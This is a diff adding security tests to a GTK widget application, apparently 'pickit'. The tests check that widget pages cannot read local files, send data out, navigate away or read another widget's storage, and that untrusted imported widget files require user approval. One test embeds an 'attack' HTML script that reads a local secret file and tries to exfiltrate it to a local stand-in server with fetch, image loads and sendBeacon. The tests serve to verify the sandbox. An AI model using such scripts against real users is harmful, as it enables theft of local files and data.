@@ -73,6 +73,73 @@ loop.run()
 read_color()
 assert colors == ["rgb(240, 166, 74)", "rgb(91, 155, 213)"], colors
 print("ok: HTML widgets get the theme as CSS variables, live")
+
+# Widget scripts can't read local files, send data anywhere, navigate away or read other
+# widgets' storage. A local server counts every request that gets out.
+import http.server  # noqa: E402
+import threading  # noqa: E402
+
+hits = []
+
+
+class Counter(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        hits.append(self.path)
+        self.send_response(200)
+        self.end_headers()
+
+    do_POST = do_GET
+
+    def log_message(self, *_):
+        pass
+
+
+server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Counter)
+threading.Thread(target=server.serve_forever, daemon=True).start()
+url = f"http://127.0.0.1:{server.server_port}"
+secret = Path(tempfile.mkdtemp()) / "secret.txt"
+secret.write_text("TOPSECRET")
+
+
+def evaluate(v, code):
+    out = []
+
+    def done(view_, result):
+        out.append(view_.evaluate_javascript_finish(result).to_string())
+        loop.quit()
+    v.evaluate_javascript(code, -1, None, None, None, done)
+    loop.run()
+    return out[0]
+
+
+attack = f"""<html><body><script>
+window.r = {{}};
+fetch("{secret.as_uri()}").then(x => x.text()).then(t => r.fetch = t, () => r.fetch = "blocked");
+try {{ const x = new XMLHttpRequest(); x.open("GET", "{secret.as_uri()}", false); x.send();
+      r.xhr = x.responseText; }} catch (e) {{ r.xhr = "blocked"; }}
+fetch("{url}/fetch", {{mode: "no-cors"}}).catch(() => {{}});
+new Image().src = "{url}/image";
+navigator.sendBeacon("{url}/beacon", "TOPSECRET");
+localStorage.setItem("mine", "TOPSECRET");
+</script></body></html>"""
+view.load_widget(attack, {}, False, host="attacker")
+GLib.timeout_add(1200, loop.quit)
+loop.run()
+result = evaluate(view, "JSON.stringify(r)")
+assert "TOPSECRET" not in result, f"a widget read a local file: {result}"
+evaluate(view, f"location.href = '{url}/navigate'; window.open('{url}/popup'); 1")
+GLib.timeout_add(500, loop.quit)
+loop.run()
+assert view.get_uri().startswith("pickit-widget://attacker/"), view.get_uri()
+other = WidgetView()
+other.load_widget("<html><body><script>window.v = String(localStorage.getItem('mine'))</script></body></html>",
+                  {}, False, host="other")
+GLib.timeout_add(800, loop.quit)
+loop.run()
+assert evaluate(other, "window.v") == "null", "a widget read another widget's localStorage"
+server.shutdown()
+assert not hits, f"a widget page sent requests: {hits}"
+print("ok: widget pages can't read files, send data, navigate away or read other widgets' storage")
 for w in windows:
     w.destroy()
 Gtk.main_iteration_do(False)
@@ -88,6 +155,44 @@ GLib.timeout_add(500, loop.quit)
 loop.run()  # the Ollama page's model lookup fails quietly against a closed port
 dlg.destroy()
 print("ok: settings dialog pages")
+
+# Nothing from a .pickit file opens until the user trusts it; an HTML widget asks even
+# without commands, since it contains JavaScript.
+from types import SimpleNamespace  # noqa: E402
+
+
+class Opened(Exception):
+    pass
+
+
+def opens(spec, untrusted, answer):
+    asked = []
+
+    def ask(*_a, **_kw):
+        asked.append(True)
+        return answer
+    app.confirm, app.approval_dialog = ask, ask
+    maker = SimpleNamespace(busy=False, _can_drop_code_edits=lambda: True)
+    maker.present = lambda: (_ for _ in ()).throw(Opened())  # past the trust check
+    try:
+        app.MakerWindow.open_spec(maker, dict(spec), "test", "test", untrusted=untrusted)
+    except Opened:
+        return True, bool(asked)
+    return False, bool(asked)
+
+
+real_confirm, real_approval = app.confirm, app.approval_dialog
+html_spec = {"name": "H", "engine": "html", "html": "<p>x</p>", "commands": {}, "position": "center"}
+native_spec = {"name": "N", "engine": "native", "ui": {"type": "label", "text": "x"}, "commands": {},
+               "position": "center"}
+with_commands = {**native_spec, "commands": {"c": {"cmd": "echo 1", "interval": 5}}}
+assert opens(html_spec, True, False) == (False, True), "an untrusted HTML widget opened without asking"
+assert opens(html_spec, True, True) == (True, True)
+assert opens(native_spec, True, False) == (True, False), "a native file without commands has nothing to ask"
+assert opens(with_commands, True, False) == (False, True), "rejecting a file's commands must cancel it"
+assert opens(html_spec, False, False) == (True, False), "gallery widgets must not ask"
+app.confirm, app.approval_dialog = real_confirm, real_approval
+print("ok: imported files open only when trusted")
 
 from pickit import gallery  # noqa: E402
 from pickit.gallery_ui import GalleryWindow  # noqa: E402
